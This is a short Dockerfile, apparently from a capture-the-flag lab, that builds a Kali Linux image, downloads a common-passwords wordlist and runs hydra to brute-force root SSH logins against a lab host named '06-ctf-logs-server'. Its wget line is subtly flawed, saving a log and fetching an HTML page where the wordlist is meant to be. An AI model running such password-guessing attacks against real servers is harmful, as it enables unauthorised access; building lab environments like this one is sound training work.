# Choose the right Debian tag
# https://hub.docker.com/_/debian/tags
FROM kalilinux/kali-rolling

# Récupération des variables
ARG FENELON_1
ARG FENELON_2
ARG FENELON_3

ARG USER_1
ARG PASSWORD_1
ARG USER_2
ARG PASSWORD_2
ARG USER_3
ARG PASSWORD_3
ARG USER_4
ARG PASSWORD_4


# Commandes d'installation de base
RUN apt update && apt install hydra wget -y

# Récupération d'une wordlist
RUN mkdir -p /usr/share/wordlists
RUN wget https://github.com/kkrypt0nn/wordlists/blob/main/wordlists/passwords/common_passwords_win.txt -o /usr/share/wordlists/passwords.txt

# Tentatives de connexion SSH avec root
RUN hydra -s 2222 -l root -P /usr/share/wordlists/passwords.txt 06-ctf-logs-server -t 4 ssh